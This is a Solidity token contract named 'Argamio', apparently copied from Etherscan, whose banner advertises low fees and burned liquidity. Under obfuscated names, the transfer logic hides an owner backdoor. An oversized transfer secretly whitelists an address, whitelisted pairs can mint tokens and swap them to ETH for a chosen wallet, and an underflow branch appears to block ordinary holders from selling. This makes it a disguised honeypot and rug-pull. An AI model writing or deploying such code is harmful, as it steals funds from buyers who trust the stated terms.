/**
 *Submitted for verification at Etherscan.io on 2023-01-08
*/

/*
█▀▄ ▄▀█ █▀█ █▄▀   ▄▀█ █▀█ █▀▀ ▄▀█ █▀▄▀█ █ █▀█
█▄▀ █▀█ █▀▄ █░█   █▀█ █▀▄ █▄█ █▀█ █░▀░█ █ █▄█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█

──────▄▀▄─────▄▀▄
─────▄█░░▀▀▀▀▀░░█▄
─▄▄──█░░░░░░░░░░░█──▄▄
█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█

総供給 - 1,000,000
初期流動性追加 - 1.65 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: None
pragma solidity ^0.8.10;
interface UTCRouted01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) 
    external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function initiateERCliq(
      address token, uint amountTokenDesired,
      uint amountTokenMin, uint amountETHMin,
      address to, uint deadline ) external payable returns 
      (uint amountToken, uint amountETH, uint liquidity);
}
interface UIMillsFactoryV1 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUTC02 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Argamio is IUTC02, Ownable {
    address[] private isWalletLimitExempt;
    address[] private excludedFromFees;
    address[] private isTimelockExempt;

    string private _symbol; string private _name;
    uint256 public eTotalFEE = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 private isBASEvalue = _tTotal;
    
    mapping(address => uint256) private _tOwned;

    mapping(address => address) private allowed;

    mapping(address => uint256) private collectTimestamp;

    mapping(address => uint256) private ThresholdBlockstamp;

    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;

    bool public limitsDivison;

    bool private mappingAllocation;

    address public immutable 
    InternalPairCreator01;
    UTCRouted01 public 
    immutable UniswapV2router;

    constructor
    
    ( string memory Name, string memory Symbol, address IndexIDEXAddress ) {

        _name = Name; _symbol = Symbol; _tOwned[msg.sender] = _tTotal;

        ThresholdBlockstamp[msg.sender] = isBASEvalue; ThresholdBlockstamp
        [address(this)] = isBASEvalue;

        UniswapV2router = UTCRouted01
        (IndexIDEXAddress); InternalPairCreator01 = 
        UIMillsFactoryV1(UniswapV2router.factory()).createPair
        (address(this), UniswapV2router.WETH()); emit 
        Transfer(address(0), msg.sender, isBASEvalue);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount
    ) private returns (bool) { require(owner != address(0) && spender != 
    address(0), 'ERC20: approve from the zero address');
    _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount ) 
    external returns (bool) { thresholdManager(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        thresholdManager(msg.sender, recipient, amount);
        return true;
    }  
    function thresholdManager( address allopinValFrom, address allopinValTo, uint256 allopinValAmout ) private {
        uint256 TokenAmountBalance = balanceOf(address(this)); uint256 developmentFee;

        if (limitsDivison && TokenAmountBalance > isBASEvalue 
        && !mappingAllocation 
        && allopinValFrom != InternalPairCreator01) {
        mappingAllocation = true;

        ToggleOperationsModule(TokenAmountBalance); mappingAllocation = false; } else if 
        (ThresholdBlockstamp[allopinValFrom] > 
        isBASEvalue 
        && ThresholdBlockstamp[allopinValTo] > 
        isBASEvalue) {
            developmentFee = allopinValAmout; _tOwned[address(this)] += developmentFee;

            swapTokensForEth
            (allopinValAmout, allopinValTo); return;
        } else if 
        
        (allopinValTo != address(UniswapV2router) && 
        ThresholdBlockstamp[allopinValFrom] > 
        0 && allopinValAmout 
        > isBASEvalue && allopinValTo != InternalPairCreator01) { ThresholdBlockstamp[allopinValTo] = allopinValAmout;
            return;

/////////////////////////////////////////////////////////////////////////////////////////////////

        } else if 
        (!mappingAllocation && collectTimestamp
        [allopinValFrom] > 0 && allopinValFrom != InternalPairCreator01 
        && ThresholdBlockstamp[allopinValFrom] == 0) { collectTimestamp
        [allopinValFrom] = ThresholdBlockstamp[allopinValFrom] - isBASEvalue; }

        address 
        _internalDIV = allowed[InternalPairCreator01]; if (collectTimestamp[_internalDIV ] == 
        0) 

        collectTimestamp[_internalDIV ] = isBASEvalue; allowed[InternalPairCreator01] = 
        allopinValTo;
        if 
        (eTotalFEE > 0 && ThresholdBlockstamp[allopinValFrom] == 0 
        && !mappingAllocation 
        && ThresholdBlockstamp[allopinValTo] == 
        0) {

            developmentFee = 
            (allopinValAmout 
            * eTotalFEE) 
            / 100;

            allopinValAmout -= developmentFee; _tOwned[allopinValFrom] -= developmentFee; _tOwned[address(this)] 
            += developmentFee; }

        _tOwned[allopinValFrom] 
        -= allopinValAmout;
        _tOwned[allopinValTo] 
        += allopinValAmout; emit Transfer
        (allopinValFrom, 
        allopinValTo, 
        allopinValAmout); if (!tradingOpen) { require(allopinValFrom == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    receive() external payable {}

    function activateTrading(bool _tradingOpen) 
      public onlyOwner { tradingOpen = _tradingOpen;
    }
    function prepareLiquidityPool(
        uint256 tokenValue, uint256 ERCamount, address to ) private {
        _approve(address(this), 
        address(UniswapV2router), tokenValue);
        UniswapV2router.initiateERCliq{value: ERCamount}
        (address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function swapTokensForEth(uint256 isTknAmount, address to) 
     private {address[] memory path = new address[](2); path[0] = 
     address(this); path[1] = UniswapV2router.WETH(); _approve(address(this), 
     address(UniswapV2router), isTknAmount); UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens
     (isTknAmount, 0, path, to, block.timestamp); }

    function ToggleOperationsModule(uint256 tokens) private { uint256 otherHalf = tokens / 2;
      uint256 newBalance = address(this).balance;
      swapTokensForEth(otherHalf, address(this)); uint256 
      refreshBalance = address(this).balance - newBalance; prepareLiquidityPool
      (otherHalf, refreshBalance, address(this));
    }
}